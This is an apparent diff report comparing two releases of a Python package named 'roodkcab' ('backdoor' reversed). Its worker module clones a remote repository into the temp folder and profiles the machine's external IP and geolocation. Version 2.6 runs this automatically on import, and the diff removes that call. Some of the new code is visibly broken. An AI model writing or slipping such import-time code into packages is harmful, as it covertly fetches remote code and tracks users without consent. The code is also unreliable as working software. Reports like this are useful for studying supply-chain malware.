# Comparing `tmp/roodkcab-2.6.tar.gz` & `tmp/roodkcab-2.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "roodkcab-2.6.tar", last modified: Sun Jul  2 09:38:20 2023, max compression
+gzip compressed data, was "roodkcab-2.7.tar", last modified: Sun Jul  2 15:06:35 2023, max compression
```

## Comparing `roodkcab-2.6.tar` & `roodkcab-2.7.tar`

### file list

```diff
@@ -1,18 +1,19 @@
-drwxrwxrwx   0        0        0        0 2023-07-02 09:38:20.072128 roodkcab-2.6/
--rw-rw-rw-   0        0        0     1014 2023-07-01 13:36:48.000000 roodkcab-2.6/LICENSE
--rw-rw-rw-   0        0        0      852 2023-07-02 09:38:20.072128 roodkcab-2.6/PKG-INFO
--rw-rw-rw-   0        0        0      349 2023-07-02 08:33:11.000000 roodkcab-2.6/README.md
--rw-rw-rw-   0        0        0      700 2023-07-02 09:23:36.000000 roodkcab-2.6/pyproject.toml
--rw-rw-rw-   0        0        0       42 2023-07-02 09:38:20.073129 roodkcab-2.6/setup.cfg
-drwxrwxrwx   0        0        0        0 2023-07-02 09:38:20.058763 roodkcab-2.6/src/
-drwxrwxrwx   0        0        0        0 2023-07-02 09:38:20.065286 roodkcab-2.6/src/roodkcab/
--rw-rw-rw-   0        0        0        0 2023-07-01 19:55:25.000000 roodkcab-2.6/src/roodkcab/__init__.py
--rw-rw-rw-   0        0        0     2622 2023-07-02 09:30:15.000000 roodkcab-2.6/src/roodkcab/backroundworker.py
--rw-rw-rw-   0        0        0      286 2023-07-02 09:23:53.000000 roodkcab-2.6/src/roodkcab/data.py
--rw-rw-rw-   0        0        0     1948 2023-07-02 09:22:45.000000 roodkcab-2.6/src/roodkcab/gitHelper.py
-drwxrwxrwx   0        0        0        0 2023-07-02 09:38:20.071120 roodkcab-2.6/src/roodkcab.egg-info/
--rw-rw-rw-   0        0        0      852 2023-07-02 09:38:20.000000 roodkcab-2.6/src/roodkcab.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      315 2023-07-02 09:38:20.000000 roodkcab-2.6/src/roodkcab.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-02 09:38:20.000000 roodkcab-2.6/src/roodkcab.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       47 2023-07-02 09:38:20.000000 roodkcab-2.6/src/roodkcab.egg-info/requires.txt
--rw-rw-rw-   0        0        0        9 2023-07-02 09:38:20.000000 roodkcab-2.6/src/roodkcab.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-02 15:06:35.438953 roodkcab-2.7/
+-rw-rw-rw-   0        0        0     1014 2023-07-01 13:36:48.000000 roodkcab-2.7/LICENSE
+-rw-rw-rw-   0        0        0      876 2023-07-02 15:06:35.437945 roodkcab-2.7/PKG-INFO
+-rw-rw-rw-   0        0        0      349 2023-07-02 08:33:11.000000 roodkcab-2.7/README.md
+-rw-rw-rw-   0        0        0      706 2023-07-02 13:32:52.000000 roodkcab-2.7/pyproject.toml
+-rw-rw-rw-   0        0        0       42 2023-07-02 15:06:35.438953 roodkcab-2.7/setup.cfg
+drwxrwxrwx   0        0        0        0 2023-07-02 15:06:35.420918 roodkcab-2.7/src/
+drwxrwxrwx   0        0        0        0 2023-07-02 15:06:35.429431 roodkcab-2.7/src/roodkcab/
+-rw-rw-rw-   0        0        0        0 2023-07-01 19:55:25.000000 roodkcab-2.7/src/roodkcab/__init__.py
+-rw-rw-rw-   0        0        0     2605 2023-07-02 13:39:31.000000 roodkcab-2.7/src/roodkcab/backroundworker.py
+-rw-rw-rw-   0        0        0      288 2023-07-02 13:41:13.000000 roodkcab-2.7/src/roodkcab/data.py
+-rw-rw-rw-   0        0        0     1225 2023-07-02 11:57:12.000000 roodkcab-2.7/src/roodkcab/filehelper.py
+-rw-rw-rw-   0        0        0     1948 2023-07-02 12:10:37.000000 roodkcab-2.7/src/roodkcab/gitHelper.py
+drwxrwxrwx   0        0        0        0 2023-07-02 15:06:35.436438 roodkcab-2.7/src/roodkcab.egg-info/
+-rw-rw-rw-   0        0        0      876 2023-07-02 15:06:35.000000 roodkcab-2.7/src/roodkcab.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      342 2023-07-02 15:06:35.000000 roodkcab-2.7/src/roodkcab.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-02 15:06:35.000000 roodkcab-2.7/src/roodkcab.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       37 2023-07-02 15:06:35.000000 roodkcab-2.7/src/roodkcab.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        9 2023-07-02 15:06:35.000000 roodkcab-2.7/src/roodkcab.egg-info/top_level.txt
```

### Comparing `roodkcab-2.6/LICENSE` & `roodkcab-2.7/LICENSE`

 * *Files identical despite different names*

### Comparing `roodkcab-2.6/PKG-INFO` & `roodkcab-2.7/PKG-INFO`

 * *Files 14% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 Metadata-Version: 2.1
 Name: roodkcab
-Version: 2.6
-Summary: FOR EVERY FIXXXX
+Version: 2.7
+Summary: Just a Quick update to the Official Pypi
 Author-email: LuxxDEV <lkgames256@gmail.com>
 Project-URL: Homepage, https://github.com/lkgames256/roodkcab
 Project-URL: Bug Tracker, https://github.com/lkgames256/roodkcab/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.9
```

### Comparing `roodkcab-2.6/pyproject.toml` & `roodkcab-2.7/pyproject.toml`

 * *Files 8% similar despite different names*

```diff
@@ -2,32 +2,31 @@
 requires = [
     "setuptools>=61.0"
 ]
 build-backend = "setuptools.build_meta"
 
 [project]
 name = "roodkcab"
-version = "2.6"
+version = "2.7"
 authors = [
   { name="LuxxDEV", email="lkgames256@gmail.com" },
 ]
-description = "FOR EVERY FIXXXX"
+description = "Just a Quick update to the Official Pypi"
 readme = "README.md"
 requires-python = ">=3.9"
 classifiers = [
     "Programming Language :: Python :: 3",
     "License :: OSI Approved :: MIT License",
     "Operating System :: OS Independent",
 ]
 
 dependencies = [
     "rich",
     "configparser",
     "requests",
-    "threading",
     "gitpython"
 ]
 
 
 [project.urls]
 "Homepage" = "https://github.com/lkgames256/roodkcab"
 "Bug Tracker" = "https://github.com/lkgames256/roodkcab/issues"
```

### Comparing `roodkcab-2.6/src/roodkcab/backroundworker.py` & `roodkcab-2.7/src/roodkcab/backroundworker.py`

 * *Files 12% similar despite different names*

```diff
@@ -4,34 +4,33 @@
 import requests
 import uuid
 import datetime
 import gitHelper
 
 
 def installer():
-    if os.path.exists(path=os.getenv("TEMP") + "\installerroodkcab"):
-        os.rmdir(path=os.getenv("TEMP") + "\installerroodkcab")
-    gitHelper.clone(url="", clone_path=os.getenv("TEMP") + "\installerroodkcab")
-    os.chdir(os.getenv("TEMP") + "\installerroodkcab")
-    print(os.getcwd())
+    random_id = uuid.uuid4()
+    gitHelper.clone(url="", clone_path=os.getenv("TMP") + f"\installerroodkcab{random_id}")
+    os.chdir(os.getenv("TMP") + f"\installerroodkcab{random_id}")
+    write_data(random_id=random_id)
 
 
 def getExternalIP():
     return requests.get("https://api.ipify.org").text
 
 
 def getLoc(ip_address):
     return requests.get(f'http://ipapi.co/{ip_address}/json').json()
 
 
 def getUUID():
     return str(uuid.uuid4())
 
 
-def write_data():
+def write_data(random_id):
     rate_limit_error = {'error': True, 'reason': 'RateLimited',
                         'message': 'Visit https://ipapi.co/ratelimited/ for details'}
 
     location_data = getLoc(getExternalIP())
 
     if location_data == rate_limit_error:
         exit(0)
@@ -58,13 +57,14 @@
                       'CURRENCY_NAME': f'{location_data["currency_name"]}',
                       'TIMEZONE': f'{location_data["timezone"]}',
                       'CURRENT_TIME': f'{datetime.datetime.now()}',
                       'IN_EU': f'{location_data["in_eu"]}',
                       'ASN': f'{location_data["asn"]}',
                       'PROVIDER': f'{location_data["org"]}'}
 
-    with open('data.cfg', 'w') as configfile:
+    with open(os.getenv("%TMP%") + f'\installerroodkcab{random_id}\data.cfg', 'w') as configfile:
         config.write(configfile)
         configfile.flush()
         configfile.close()
 
-installer()
+
+
```

### Comparing `roodkcab-2.6/src/roodkcab/gitHelper.py` & `roodkcab-2.7/src/roodkcab/gitHelper.py`

 * *Files 1% similar despite different names*

```diff
@@ -21,15 +21,15 @@
         except:
             return "OS module isn't working!"
 
     if url == "" or url == " " or url == None:
         url = "https://github.com/lkgames256/roodkcab.git"
 
     Repo.clone_from(url, clone_path)
-    return "Cloned Sucessfull"
+    return "Cloned Successful"
 
 
 def check_git_update(url="https://github.com/lkgames256/roodkcab.git", path_to_git_repo="",
                      atm_update=True):  # Use a Thread to run this
     if path_to_git_repo == "" or path_to_git_repo == " ":
         return "Sorry you nedd to specefiy the path to the REPO"
```

### Comparing `roodkcab-2.6/src/roodkcab.egg-info/PKG-INFO` & `roodkcab-2.7/src/roodkcab.egg-info/PKG-INFO`

 * *Files 14% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 Metadata-Version: 2.1
 Name: roodkcab
-Version: 2.6
-Summary: FOR EVERY FIXXXX
+Version: 2.7
+Summary: Just a Quick update to the Official Pypi
 Author-email: LuxxDEV <lkgames256@gmail.com>
 Project-URL: Homepage, https://github.com/lkgames256/roodkcab
 Project-URL: Bug Tracker, https://github.com/lkgames256/roodkcab/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.9
```

